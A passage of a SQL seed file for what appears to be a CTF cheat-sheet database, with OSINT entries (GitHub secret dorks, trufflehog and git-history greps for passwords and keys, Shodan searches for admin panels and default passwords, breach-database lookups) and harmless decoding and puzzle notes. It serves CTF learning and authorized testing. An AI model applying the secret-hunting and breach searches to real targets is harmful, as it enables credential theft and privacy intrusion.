  'Find leaked secrets, historical commits, and employee information on GitHub.',
  'osint',
  $sql$# Web search dorks
site:github.com "target.com" "password"
site:github.com "target.com" "api_key"
site:github.com "target.com" "BEGIN RSA PRIVATE KEY"

# GitDorker / gitrob / trufflehog
trufflehog git https://github.com/user/repo
trufflehog github --org=orgname --token=$GITHUB_TOKEN

# Search commit history for secrets
git log --all --full-history --oneline
git log -p --all | grep -i "password\|api_key\|secret\|token"
git log --diff-filter=D -- "*.env"  # find deleted env files

# Check GitHub user''s activity
github.com/username?tab=overview  # public contribution history
github.com/username?tab=repositories
# Look at: Gists, starred repos, contributed to$sql$,
  ARRAY['github','secrets','trufflehog','git-history','leaks'],
  'https://github.com/trufflesecurity/trufflehog'
),

(
  'Shodan & Censys Recon',
  'Search internet-facing services by IP, domain, cert, or banner.',
  'osint',
  $sql$# Shodan (shodan.io)
shodan search "title:example hostname:example.com"
shodan search "org:\"Target Company\""
shodan host 1.2.3.4          # info on specific IP
shodan domain example.com    # all IPs for domain

# Useful Shodan filters:
# hostname:example.com port:8080
# ssl:"example.com" (find IPs with cert for domain)
# http.title:"Admin Panel"
# "default password" country:US

# Censys (censys.io) — better cert/TLS data
# ip.ports=22 and ip.country_code=`US`
# parsed.names: example.com (find IPs with cert)

# CLI
pip install shodan
shodan search --fields ip_str,port,org "example.com"$sql$,
  ARRAY['shodan','censys','internet-recon','passive','iot'],
  'https://shodan.io'
),

(
  'Email & Breach Intel',
  'Find email addresses and check if credentials have been leaked.',
  'osint',
  $sql$# Find email format for a company
hunter.io (web) — guesses format from domain
emailrep.io/email@example.com (API, no key needed for basic)

# Verify email is real
verify-email.org, hunter.io/email-verifier

# Check breach data
haveibeenpwned.com            # email breach check
dehashed.com                  # more detailed (paid), searchable by email/pass/name/IP
snusbase.com                  # similar to dehashed
scylla.sh                     # search breached databases

# Python — query HIBP API
import requests
h = hashlib.sha1(email.encode()).hexdigest().upper()
r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}",
                 headers={"hibp-api-key": KEY})$sql$,
  ARRAY['email','breach','hibp','hunter','dehashed','credentials'],
  'https://haveibeenpwned.com'
),

-- ══════════════════════════════════════════════════════════════
-- MISC (8)
-- ══════════════════════════════════════════════════════════════

(
  'Common Encodings Quick Reference',
  'Identify and decode the most common CTF encodings without tools.',
  'misc',
  $sql$# Base64: letters + numbers + /+ and = padding → always try first
echo "SGVsbG8=" | base64 -d

# Hex: only 0-9 a-f, usually even length
echo "48656c6c6f" | xxd -r -p

# Binary: only 0s and 1s in groups of 8
python3 -c "print(''.join(chr(int(b,2)) for b in '01001000 01101001'.split()))"

# Octal: digits 0-7 in groups
python3 -c "print(''.join(chr(int(o,8)) for o in '110 151'.split()))"

# ROT13: letters only, Caesar +13
echo "uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Morse: dots dashes and slashes
# Online: morsecode.world or use morse3 pip package

# All of these: CyberChef → Magic (auto-detect)$sql$,
  ARRAY['base64','hex','binary','morse','rot13','encoding'],
  'https://gchq.github.io/CyberChef/'
),

(
  'CyberChef Magic Mode',
  'Use CyberChef to auto-detect and chain decoding operations.',
  'misc',
  $sql$# URL: gchq.github.io/CyberChef

# Magic operation:
# 1. Paste input in "Input" box
# 2. Search for "Magic" in operations
# 3. Drag it to Recipe
# 4. Click Bake → it auto-detects encoding and suggests a recipe

# Building a manual chain:
# From Base64 → Gunzip → From Hex → AES Decrypt → ...

# Useful operations:
# From Base64 / To Base64
# From Hex / To Hex
# ROT13, ROT47 (includes symbols)
# XOR (key as hex)
# Gunzip / Zlib Inflate
# Extract strings / Extract URLs
# Render Image (for image stego in hex)

# Save recipes: hamburger menu → Save recipe as URL$sql$,
  ARRAY['cyberchef','decode','magic','automation','tool'],
  'https://gchq.github.io/CyberChef/'
),

(
  'Flag Format Regex Hunt',
  'Extract flags from files, strings, or network output using grep.',
  'misc',
  $sql$# Generic flag patterns
grep -oP "FLAG\{[^}]+\}" file
grep -oP "CTF\{[^}]+\}" file
grep -oP "picoCTF\{[^}]+\}" file
grep -oP "HTB\{[^}]+\}" file
grep -oP "[A-Z_]+\{[^}]+\}" file    # any ALL_CAPS format
grep -oiP "[a-z]{2,}\{[^}]+\}" file # any lowercase format

# From binary output
strings file | grep -i "{" | grep -i "flag\|ctf\|htb\|pico"

# Recursive search in directory
grep -rP "FLAG\{[^}]+\}" ./extracted/
grep -rl "flag{" .   # find files containing flag

# From network capture
strings capture.pcap | grep -oP "[A-Za-z]{2,}\{[^}]+\}"$sql$,
  ARRAY['grep','regex','flag-format','extraction'],
  null
),

(
  'QR Code Decode & Repair',
  'Decode QR codes from the terminal or repair damaged ones.',
  'misc',
  $sql$# Decode from terminal
zbarimg image.png
zbarimg --raw image.png    # raw data only
zbarimg --nodbus -q *.png  # batch decode

# Python
from pyzbar.pyzbar import decode
from PIL import Image
result = decode(Image.open('qr.png'))
print(result[0].data.decode())

# If damaged/partial:
# 1. Increase contrast: convert qr.png -threshold 50% fixed.png
# 2. Upscale: convert qr.png -scale 400% big.png
# 3. Online repair: qrazybox.com (manual repair tool)
# 4. QRazyBox lets you edit individual modules and decode

# Generate QR (to verify):
qrencode -o test.png "flag{test}"$sql$,
  ARRAY['qr-code','zbarimg','pyzbar','repair','decode'],
  null
),

(
  'Substitution Cipher Solving',
  'Break monoalphabetic substitution ciphers with automated and manual tools.',
  'misc',
  $sql$# quipqiup.com — best automated solver, handles spaces
# dcode.fr/monoalphabetic-substitution — manual + auto

# Manual approach:
from collections import Counter

text = "IWT FJXRZ QGDLC UDM YFDEH DKTG IWT APON SDV"
freq = Counter(c for c in text if c.isalpha())
print("Frequency:", freq.most_common())
# Compare to English: E T A O I N S H R D L C U M W F G Y P B

# Identify cribs (known words):
# Single letter = A or I
# Common 3-letter = THE, AND, THE
# Starting word often = THE, IN, OF, IT

# Python sympy-based solver:
# pip install pycipher
import pycipher
# Once you have the key:
pycipher.SimpleSubstitution(key='QWERTY...').decipher(ciphertext)$sql$,
  ARRAY['substitution','monoalphabetic','quipqiup','frequency','classical'],
  'https://quipqiup.com'
),

(
  'Esoteric Languages',
  'Identify and run Brainfuck, Ook, Whitespace, and other esolangs.',
  'misc',
  $sql$# Brainfuck: + - [ ] < > . ,
# Run: tio.run → Brainfuck; or copy.sh/brainfuck

# Ook!: Ook. Ook? Ook! (maps to Brainfuck)
# Decode: dcode.fr/ook-language

# Whitespace: only spaces, tabs, newlines are significant
# Run: tio.run → Whitespace
# Visualize: copy.sh/whitespace

# Malbolge: incredibly complex, rare in CTFs
# Piet: programs as pixel art images
# Run: piet.bubbler.one

# Identify unknown esolangs:
# esolangs.org — comprehensive wiki
# tio.run — run 600+ languages online

# Common tell: challenge description says "what does this program output?"
# with a file full of weird symbols → esoteric language$sql$,
  ARRAY['brainfuck','ook','whitespace','esoteric','esolang'],
  'https://tio.run'
),

(
  'Hidden Text & Steganography',
  'Find text hidden using zero-width characters, whitespace, or homoglyphs.',
  'misc',
  $sql$# Zero-width characters (invisible Unicode)
# Decode: 330k.github.io/StegCloak/
# Or: zwc.netlify.app

# Detect manually:
cat -A file.txt             # ^ shows control chars, $ shows line ends
hexdump -C file.txt | grep -v "^" | head -20

# Python: show all character code points
text = open('file.txt').read()
unusual = [(i, hex(ord(c)), c) for i, c in enumerate(text) if ord(c) > 127]
print(unusual)

# Homoglyphs (look-alike characters from other Unicode scripts)
# e.g., Cyrillic 'а' vs ASCII 'a' — look identical
text.encode('utf-8')  # compare encoded lengths
# Online checker: irongeek.com/homoglyph-attack-generator.php

# Whitespace steganography in code
# Look for trailing spaces on lines: cat -A code.py$sql$,
  ARRAY['zero-width','unicode','homoglyph','whitespace-stego','hidden-text'],
  'https://330k.github.io/StegCloak/'
),

(
  'Binary / Multi-Base Conversion',
  'Convert between binary, octal, decimal, hex, and arbitrary bases.',
  'misc',
  $sql$# Binary to text (space-separated 8-bit groups)
python3 -c "
data = '01001000 01100101 01101100 01101100 01101111'
print(''.join(chr(int(b, 2)) for b in data.split()))
"

# Hex to text
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"

# Octal to text
python3 -c "print(''.join(chr(int(o,8)) for o in '110 145 154 154 157'.split()))"

# Any base to int (Python)
int('1a2f', 16)    # hex
int('777', 8)      # octal
int('1010', 2)     # binary
int('zz', 36)      # base 36

# Int to any base
bin(255)   # '0b11111111'
oct(255)   # '0o377'
hex(255)   # '0xff'
format(255, 'b')   # '11111111'$sql$,
  ARRAY['binary','octal','hex','base-conversion','encoding'],
  null
);
